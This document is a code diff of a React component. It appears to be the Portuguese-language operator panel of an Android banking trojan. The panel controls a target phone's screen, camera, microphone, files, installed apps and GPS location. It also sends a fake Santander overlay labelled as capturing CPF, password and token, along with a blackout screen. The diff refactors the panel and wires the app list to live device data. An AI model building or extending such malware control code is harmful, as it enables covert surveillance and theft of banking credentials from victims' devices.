@@ -67,7 +67,6 @@ function QualityBar({ value, onChange }: { value: number; onChange: (v: number) 
   );
 }
 
-// ── Live Screen ────────────────────────────────────────────────────
 function LiveScreen({ device, socket }: { device: any; socket: any }) {
   const [quality, setQuality] = useState(30);
   const [streaming, setStreaming] = useState(false);
@@ -143,7 +142,6 @@ function LiveScreen({ device, socket }: { device: any; socket: any }) {
   );
 }
 
-// ── Camera ────────────────────────────────────────────────────────
 function CameraView({ device, socket }: { device: any; socket: any }) {
   const [camType, setCamType] = useState<"front" | "back">("front");
   const [active, setActive] = useState(false);
@@ -225,7 +223,6 @@ function CameraView({ device, socket }: { device: any; socket: any }) {
   );
 }
 
-// ── Microphone ───────────────────────────────────────────────────
 function MicView({ device, socket }: { device: any; socket: any }) {
   const [active, setActive] = useState(false);
   const [bars] = useState(() => Array.from({ length: 20 }, () => Math.random()));
@@ -282,7 +279,6 @@ function MicView({ device, socket }: { device: any; socket: any }) {
   );
 }
 
-// ── Files ─────────────────────────────────────────────────────────
 function FilesView({ device, socket }: { device: any; socket: any }) {
   const [path, setPath] = useState("/sdcard");
   const [files] = useState([
@@ -358,18 +354,20 @@ function FilesView({ device, socket }: { device: any; socket: any }) {
   );
 }
 
-// ── Apps ──────────────────────────────────────────────────────────
 function AppsView({ device, socket }: { device: any; socket: any }) {
-  const apps = [
-    { name: "WhatsApp", package: "com.whatsapp", running: true },
-    { name: "Instagram", package: "com.instagram.android", running: false },
-    { name: "Nubank", package: "com.nubank", running: true },
-    { name: "Itaú", package: "com.itau", running: false },
-    { name: "Google Chrome", package: "com.android.chrome", running: true },
-    { name: "Câmera", package: "com.android.camera2", running: false },
-    { name: "Mensagens", package: "com.google.android.apps.messaging", running: false },
-    { name: "Configurações", package: "com.android.settings", running: true },
-  ];
+  const [apps, setApps] = useState<any[]>([]);
+
+  useEffect(() => {
+    const handle = (data: { deviceId: number; apps?: any[] }) => {
+      if (data.deviceId === device.id) setApps(Array.isArray(data.apps) ? data.apps : []);
+    };
+    socket.on("get_apps", handle);
+    return () => { socket.off("get_apps", handle); };
+  }, [socket, device.id]);
+
+  useEffect(() => {
+    socket.emit("get_apps", { deviceId: device.id });
+  }, [socket, device.id]);
 
   return (
     <div>
@@ -417,7 +415,6 @@ function AppsView({ device, socket }: { device: any; socket: any }) {
   );
 }
 
-// ── Location ──────────────────────────────────────────────────────
 function LocationView({ device, socket }: { device: any; socket: any }) {
   const [tracking, setTracking] = useState(false);
   const [coords, setCoords] = useState<{ lat: number; lng: number; acc: number } | null>(null);
@@ -460,62 +457,24 @@ function LocationView({ device, socket }: { device: any; socket: any }) {
         )}
       </div>
 
-      {/* Map placeholder */}
-      <div
-        style={{
-          width: "100%",
-          height: 300,
-          background: "#010d03",
-          border: `1px solid ${DIM}`,
-          display: "flex",
-          alignItems: "center",
-          justifyContent: "center",
-          flexDirection: "column",
-          gap: 12,
-          position: "relative",
-          overflow: "hidden",
-        }}
-      >
-        {/* Grid lines */}
-        {Array.from({ length: 8 }).map((_, i) => (
-          <div key={`h${i}`} style={{ position: "absolute", top: `${i * 14.28}%`, left: 0, right: 0, height: 1, background: "#0a1a0c" }} />
-        ))}
-        {Array.from({ length: 8 }).map((_, i) => (
-          <div key={`v${i}`} style={{ position: "absolute", left: `${i * 14.28}%`, top: 0, bottom: 0, width: 1, background: "#0a1a0c" }} />
-        ))}
-
+      <div style={{ width: "100%", height: 300, background: "#010d03", border: `1px solid ${DIM}`, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 12, position: "relative", overflow: "hidden" }}>
         {coords ? (
           <>
             <div style={{ fontSize: 32, zIndex: 1 }}>📍</div>
             <div style={{ color: G, fontSize: 10, zIndex: 1 }}>{coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}</div>
             <div style={{ color: "#445", fontSize: 8, zIndex: 1 }}>Precisão: ±{coords.acc}m</div>
-            <a
-              href={`https://maps.google.com/?q=${coords.lat},${coords.lng}`}
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{
-                color: G,
-                fontSize: 9,
-                border: `1px solid ${G}`,
-                padding: "3px 10px",
-                textDecoration: "none",
-                zIndex: 1,
-              }}
-            >
+            <a href={`https://maps.google.com/?q=${coords.lat},${coords.lng}`} target="_blank" rel="noopener noreferrer" style={{ color: G, fontSize: 9, border: `1px solid ${G}`, padding: "3px 10px", textDecoration: "none", zIndex: 1 }}>
               [ VER NO GOOGLE MAPS ]
             </a>
           </>
         ) : (
-          <div style={{ color: "#334", fontSize: 10 }}>
-            {tracking ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO SINAL GPS...</> : "> RASTREIO GPS INATIVO"}
-          </div>
+          <div style={{ color: "#334", fontSize: 10 }}>{tracking ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO SINAL GPS...</> : "> RASTREIO GPS INATIVO"}</div>
         )}
       </div>
     </div>
   );
 }
 
-// ── Overlay ──────────────────────────────────────────────────────
 function OverlayView({ device, socket }: { device: any; socket: any }) {
   const send = (cmd: string) => socket.emit("command:send", { deviceId: device.id, command: cmd });
 
@@ -525,202 +484,63 @@ function OverlayView({ device, socket }: { device: any; socket: any }) {
         SELECIONE O TEMPLATE DE OVERLAY PARA INJETAR NO DISPOSITIVO ALVO
       </div>
       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 10 }}>
-        {/* Santander */}
-        <button
-          onClick={() => send("overlay:santander")}
-          style={{
-            background: "#0a0000",
-            border: "2px solid #ec0000",
-            color: "#ec0000",
-            padding: "16px 10px",
-            cursor: "pointer",
-            fontFamily: "inherit",
-            fontSize: 10,
-            fontWeight: "bold",
-            letterSpacing: "0.12em",
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            gap: 6,
-            transition: "all 0.15s",
-          }}
-          onMouseEnter={(e) => { e.currentTarget.style.boxShadow = "0 0 16px #ec000066"; }}
-          onMouseLeave={(e) => { e.currentTarget.style.boxShadow = "none"; }}
-        >
+        <button onClick={() => send("overlay:santander")} style={{ background: "#0a0000", border: "2px solid #ec0000", color: "#ec0000", padding: "16px 10px", cursor: "pointer", fontFamily: "inherit", fontSize: 10, fontWeight: "bold", letterSpacing: "0.12em", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, transition: "all 0.15s" }}>
           <span style={{ fontSize: 24 }}>🏦</span>
           <span style={{ color: "#ec0000" }}>SANTANDER</span>
           <span style={{ fontSize: 7, color: "#664444" }}>Captura CPF + Senha + Token</span>
         </button>
-
-        {/* Blackout */}
-        <button
-          onClick={() => send("overlay:blackout")}
-          style={{
-            background: "#050505",
-            border: "2px solid #333",
-            color: "#888",
-            padding: "16px 10px",
-            cursor: "pointer",
-            fontFamily: "inherit",
-            fontSize: 10,
-            fontWeight: "bold",
-            letterSpacing: "0.12em",
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            gap: 6,
-            transition: "all 0.15s",
-          }}
-          onMouseEnter={(e) => { e.currentTarget.style.borderColor = "#555"; }}
-          onMouseLeave={(e) => { e.currentTarget.style.borderColor = "#333"; }}
-        >
+        <button onClick={() => send("overlay:blackout")} style={{ background: "#050505", border: "2px solid #333", color: "#888", padding: "16px 10px", cursor: "pointer", fontFamily: "inherit", fontSize: 10, fontWeight: "bold", letterSpacing: "0.12em", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, transition: "all 0.15s" }}>
           <span style={{ fontSize: 24 }}>⬛</span>
           <span>BLACKOUT MODE</span>
           <span style={{ fontSize: 7, color: "#445" }}>Tela preta total (#000000)</span>
         </button>
-
-        {/* Remove overlay */}
-        <button
-          onClick={() => send("overlay:remove")}
-          style={{
-            background: "transparent",
-            border: `1px solid ${DIM}`,
-            color: "#445",
-            padding: "10px",
-            cursor: "pointer",
-            fontFamily: "inherit",
-            fontSize: 9,
-            letterSpacing: "0.1em",
-            gridColumn: "span 2",
-          }}
-        >
+        <button onClick={() => send("overlay:remove")} style={{ background: "transparent", border: `1px solid ${DIM}`, color: "#445", padding: "10px", cursor: "pointer", fontFamily: "inherit", fontSize: 9, letterSpacing: "0.1em", gridColumn: "span 2" }}>
           [ REMOVER OVERLAY ]
         </button>
       </div>
-
-      {/* Santander preview */}
       <Panel style={{ borderColor: "#ec000044" }}>
         <PanelHeader>
-          <span style={{ color: "#ec0000" }}>&gt; PREVIEW: SANTANDER OVERLAY</span>
+          <span>&gt; OVERLAY PREVIEW</span>
+          <span style={{ color: "#664444" }}>BLOQUEIO</span>
         </PanelHeader>
-        <div
-          style={{
-            background: "#ec0000",
-            padding: 16,
-            textAlign: "center",
-          }}
-        >
-          <div style={{ color: "#fff", fontWeight: "bold", fontSize: 14, letterSpacing: "0.1em", marginBottom: 12 }}>
-            🏦 Santander
-          </div>
-          <div style={{ color: "#ffcccc", fontSize: 9, marginBottom: 12 }}>
-            Por segurança, confirme seus dados
-          </div>
-          {["CPF", "SENHA", "TOKEN"].map((field) => (
-            <div key={field} style={{ marginBottom: 8 }}>
-              <div style={{ fontSize: 7, color: "#ffaaaa", textAlign: "left", marginBottom: 2 }}>{field}</div>
-              <div style={{ background: "#fff", height: 28, borderRadius: 4 }} />
-            </div>
-          ))}
-          <div
-            style={{
-              background: "#8b0000",
-              color: "#fff",
-              padding: "8px",
-              fontSize: 10,
-              fontWeight: "bold",
-              borderRadius: 4,
-              marginTop: 8,
-            }}
-          >
-            CONFIRMAR
-          </div>
+        <div style={{ padding: 20, textAlign: "center", color: "#8a0000", background: "#020202", fontSize: 10 }}>
+          Pré-visualização do overlay selecionado.
         </div>
       </Panel>
     </div>
   );
 }
 
-// ── Main DeviceTools ──────────────────────────────────────────────
 export default function DeviceTools({ device, onBack }: Props) {
-  const [activeTool, setActiveTool] = useState<Tool>("screen");
   const socket = useSocket();
+  const [activeTool, setActiveTool] = useState<Tool>("screen");
 
-  const tools: { id: Tool; icon: string; label: string }[] = [
-    { id: "screen", icon: "🖥", label: "LIVE SCREEN" },
-    { id: "camera", icon: "📷", label: "CÂMERA" },
-    { id: "mic", icon: "🎙", label: "MICROFONE" },
-    { id: "files", icon: "📁", label: "ARQUIVOS" },
-    { id: "apps", icon: "📦", label: "APPS" },
-    { id: "location", icon: "📍", label: "LOCALIZAÇÃO" },
-    { id: "overlay", icon: "🎭", label: "OVERLAY" },
-  ];
+  const send = (cmd: string) => socket.emit("command:send", { deviceId: device.id, command: cmd });
 
   return (
-    <div>
-      {/* Header */}
-      <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 12, paddingBottom: 10, borderBottom: `1px solid #1a3a20` }}>
-        <button
-          onClick={onBack}
-          style={{
-            background: "transparent",
-            border: `1px solid ${DIM}`,
-            color: G,
-            fontSize: 9,
-            padding: "4px 10px",
-            cursor: "pointer",
-            fontFamily: "inherit",
-            letterSpacing: "0.08em",
-          }}
-        >
-          ◀ VOLTAR
-        </button>
-        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-          <span style={{ fontSize: 20 }}>📱</span>
-          <div>
-            <div style={{ fontSize: 12, fontWeight: "bold", color: G, letterSpacing: "0.15em" }}>
-              {device.name}
-            </div>
-            <div style={{ fontSize: 8, color: "#445" }}>{device.model || "Android Device"} · {device.status?.toUpperCase()}</div>
-          </div>
-        </div>
-        <div style={{ flex: 1 }} />
-        <div style={{ display: "flex", gap: 6 }}>
-          {device.hasRoot && <span style={{ fontSize: 8, padding: "2px 6px", border: "1px solid #ff8800", color: "#ff8800" }}>ROOT</span>}
-          {device.gpsActive && <span style={{ fontSize: 8, padding: "2px 6px", border: `1px solid ${G}`, color: G }}>GPS</span>}
-          {device.accessibilityOn && <span style={{ fontSize: 8, padding: "2px 6px", border: "1px solid #44aaff", color: "#44aaff" }}>ACC</span>}
-        </div>
+    <div className="panel" style={{ display: "flex", flexDirection: "column", minHeight: "100%", overflow: "hidden" }}>
+      <PanelHeader>
+        <button onClick={onBack} style={{ background: "transparent", border: "none", color: G, cursor: "pointer", fontFamily: "inherit", fontSize: 8, letterSpacing: "0.1em" }}>[ VOLTAR ]</button>
+        <span style={{ color: "#445", fontSize: 8 }}>{device.name}</span>
+      </PanelHeader>
+      <div style={{ display: "grid", gridTemplateColumns: "repeat(7, 1fr)", gap: 4, padding: 4 }}>
+        <ToolBtn icon="🖥️" label="TELA" active={activeTool === "screen"} onClick={() => setActiveTool("screen")} />
+        <ToolBtn icon="📷" label="CÂMERA" active={activeTool === "camera"} onClick={() => setActiveTool("camera")} />
+        <ToolBtn icon="🎙️" label="MIC" active={activeTool === "mic"} onClick={() => setActiveTool("mic")} />
+        <ToolBtn icon="📁" label="ARQUIVOS" active={activeTool === "files"} onClick={() => setActiveTool("files")} />
+        <ToolBtn icon="📦" label="APPS" active={activeTool === "apps"} onClick={() => setActiveTool("apps")} />
+        <ToolBtn icon="📍" label="GPS" active={activeTool === "location"} onClick={() => setActiveTool("location")} />
+        <ToolBtn icon="⛶" label="OVERLAY" active={activeTool === "overlay"} onClick={() => setActiveTool("overlay")} />
       </div>
-
-      {/* Tool selector */}
-      <div style={{ display: "flex", gap: 4, marginBottom: 12, flexWrap: "wrap" }}>
-        {tools.map((t) => (
-          <ToolBtn
-            key={t.id}
-            icon={t.icon}
-            label={t.label}
-            active={activeTool === t.id}
-            onClick={() => setActiveTool(t.id)}
-          />
-        ))}
+      <div style={{ padding: 8, overflow: "auto", flex: 1 }}>
+        {activeTool === "screen" && <LiveScreen device={device} socket={socket} />}
+        {activeTool === "camera" && <CameraView device={device} socket={socket} />}
+        {activeTool === "mic" && <MicView device={device} socket={socket} />}
+        {activeTool === "files" && <FilesView device={device} socket={socket} />}
+        {activeTool === "apps" && <AppsView device={device} socket={socket} />}
+        {activeTool === "location" && <LocationView device={device} socket={socket} />}
+        {activeTool === "overlay" && <OverlayView device={device} socket={socket} />}
       </div>
-
-      {/* Tool content */}
-      <Panel>
-        <PanelHeader>
-          <span>&gt; {tools.find(t => t.id === activeTool)?.label}</span>
-          <span style={{ color: "#445", fontSize: 8 }}>{device.name}</span>
-        </PanelHeader>
-        <div style={{ padding: 12 }}>
-          {activeTool === "screen" && <LiveScreen device={device} socket={socket} />}
-          {activeTool === "camera" && <CameraView device={device} socket={socket} />}
-          {activeTool === "mic" && <MicView device={device} socket={socket} />}
-          {activeTool === "files" && <FilesView device={device} socket={socket} />}
-          {activeTool === "apps" && <AppsView device={device} socket={socket} />}
-          {activeTool === "location" && <LocationView device={device} socket={socket} />}
-          {activeTool === "overlay" && <OverlayView device={device} socket={socket} />}
-        </div>
-      </Panel>
     </div>
   );
 }
